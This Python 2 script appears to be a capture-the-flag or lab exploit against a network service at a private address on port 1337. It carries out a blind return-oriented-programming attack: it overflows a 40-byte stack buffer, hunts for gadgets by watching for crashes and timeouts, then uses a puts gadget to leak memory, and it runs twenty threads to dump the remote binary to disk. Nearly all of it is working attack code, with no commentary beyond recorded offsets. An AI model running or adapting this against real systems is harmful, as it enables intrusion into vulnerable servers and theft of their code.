#!/usr/bin/python
import sys
import socket
import telnetlib 
import os
import time
import threading
from struct import pack, unpack

def recvuntil(sock, txt):
  d = ""
  while d.find(txt) == -1:
    try:
      dnow = sock.recv(1)
      if len(dnow) == 0:
        return ("DISCONNECTED", d)
    except socket.timeout:
      return ("TIMEOUT", d)
    except socket.error as msg:
      return ("ERROR", d)
    d += dnow
  return ("OK", d)

def recvall(sock, n):
  d = ""
  while len(d) != n:
    try:
      dnow = sock.recv(n - len(d))
      if len(dnow) == 0:
        return ("DISCONNECTED", d)
    except socket.timeout:
      return ("TIMEOUT", d)
    except socket.error as msg:
      return ("ERROR", d)
    d += dnow
  return ("OK", d)

# Proxy object for sockets.
class gsocket(object):
  def __init__(self, *p):
    self._sock = socket.socket(*p)

  def __getattr__(self, name):
    return getattr(self._sock, name)

  def recvall(self, n):
    err, ret = recvall(self._sock, n)
    if err != OK:
      return False
    return ret

  def recvuntil(self, txt):
    err, ret = recvuntil(self._sock, txt)
    if err != "OK":
      return False
    return ret

# Base for any of my ROPs.
def db(v):
  return pack("<B", v)

def dw(v):
  return pack("<H", v)

def dd(v):
  return pack("<I", v)

def dq(v):
  return pack("<Q", v)

def rb(v):
  return unpack("<B", v[0])[0]

def rw(v):
  return unpack("<H", v[:2])[0]

def rd(v):
  return unpack("<I", v[:4])[0]

def rq(v):
  return unpack("<Q", v[:8])[0]

def find_len_of_buffer(sz):  
  s = gsocket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((HOST, PORT))

  addr = int(s.recvuntil("\n").strip(), 16)
  s.recvuntil("Data size: ")
  s.sendall("%i\n" % sz)
  s.recvuntil("data: ")
  s.sendall("\x41" * sz)
  ret = s.recvuntil("Done!\n")
  if ret is False:
    s.close()
    return False

  s.close()
  return True

def find_stop_gadget(buf_offset, offset):
  s = gsocket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((HOST, PORT))

  addr = int(s.recvuntil("\n").strip(), 16) & 0xfffffffffffff000

  payload = "A" * buf_offset
  payload += dq(addr + offset) * 1
  sz = len(payload)
  
  s.recvuntil("Data size: ")
  s.sendall("%i\n" % sz)
  s.recvuntil("data: ")
  s.settimeout(3)

  s.sendall(payload)
  err, ret = recvuntil(s, "Done!\n")
  s.close()  

  t_payload = list("Echo: " + payload)
  t_ret = list(ret)
  while len(t_ret) and len(t_payload) and t_payload[0] == t_ret[0]:
    t_payload.pop(0)
    t_ret.pop(0)

  ret = ''.join(t_ret).strip()
  if ret and ret.startswith("ELF"):
    print ret
    return "PRINT"

  if err == "DISCONNECTED" or err == "ERROR":
    return "CRASH"

  if err == "TIMEOUT":
    return "INF"  

  s.close()
  return "NO_CRASH"


def find_candidate_gadgets(buf_offset, offset, inf_offset):
  s = gsocket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((HOST, PORT))

  addr = int(s.recvuntil("\n").strip(), 16) & 0xfffffffffffff000

  payload = "A" * buf_offset
  payload += dq(addr + offset) # tested
  payload += dq(0x400001)  # something that crashes
  payload += dq(addr + inf_offset) * 1

  sz = len(payload)
  
  s.recvuntil("Data size: ")
  s.sendall("%i\n" % sz)
  s.recvuntil("data: ")
  s.settimeout(3)

  s.sendall(payload)
  err, ret = recvuntil(s, "Done!\n")
  s.close()  

  t_payload = list("Echo: " + payload)
  t_ret = list(ret)
  while len(t_ret) and len(t_payload) and t_payload[0] == t_ret[0]:
    t_payload.pop(0)
    t_ret.pop(0)

  ret = ''.join(t_ret).strip()
  if ret and len(ret) < 100:
    print ret
    return "PRINT"

  if err == "DISCONNECTED" or err == "ERROR":
    return "CRASH"

  if err == "TIMEOUT":
    return "INF"  

  s.close()
  return "NO_CRASH"

def dump(buf_offset, set_rdi, puts, offset):
  s = gsocket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((HOST, PORT))

  addr = int(s.recvuntil("\n").strip(), 16) & 0xfffffffffffff000

  payload = "A" * buf_offset
  payload += dq(addr + set_rdi)
  payload += dq(addr + offset) # what to dump
  payload += dq(addr + puts)

  sz = len(payload)
  
  s.recvuntil("Data size: ")
  s.sendall("%i\n" % sz)
  s.recvuntil("data: ")
  s.settimeout(3)

  s.sendall(payload)
  err, ret = recvuntil(s, "Done!\n")
  s.close()  

  t_payload = list("Echo: " + payload)
  t_ret = list(ret)
  while len(t_ret) and len(t_payload) and t_payload[0] == t_ret[0]:
    t_payload.pop(0)
    t_ret.pop(0)

  ret = ''.join(t_ret).strip()
  if ret:
    return ret

  return None

HOST = '192.168.2.240'
PORT = 1337

# Find length
#for i in range(1, 128):
#  print "Testing:", i,
#  r = find_len_of_buffer(i)
#  print r
#  if r is False:
#    break
#i -= 1
#buf_offset = i

buf_offset = 40

# INF: 668462
# 2362 INF
# 2363 INF
# 2365 INF
# 2366 INF
# 2367 INF
# 2369 INF
# 3259 print
# 0x38e2 set rsi
# 0x212b set rdi

lock = threading.Lock()
#it = iter(range(0, 1024 * 1024 * 4))
it = iter(range(0, 1024 * 1024 * 4, 128))

def get_next():
  global lock
  global it
  with lock:
    return next(it)

def threaded_search_inf_data():
  while True:
    i = get_next()
    ret = find_candidate_gadgets(buf_offset, i, 0xccb+7+1)
    if ret == "PRINT":
      print hex(i), ret
    else:
      sys.stdout.write(".")
      sys.stdout.flush()

elf = bytearray(1024 * 1024 * 4)

def threaded_dump_data():
  while True:
    i = get_next()

    data = bytearray()

    while len(data) < 128:
      ret = dump(buf_offset, 0x212b, 0xccb+7+1, i + len(data))

      if ret is not None:
        data += ret
      data += "\0"

      sys.stdout.write(".")
      sys.stdout.flush()      

    for j, ch in enumerate(data):
      elf[i + j] = ch

    sys.stdout.write("F")
    sys.stdout.flush()      


for i in range(20):
  threading.Thread(target=threaded_dump_data).start()

while True:
  time.sleep(5)
  with open("elf.bin", "wb") as f:
    f.write(str(elf))
  sys.stdout.write("!")
  sys.stdout.flush()      


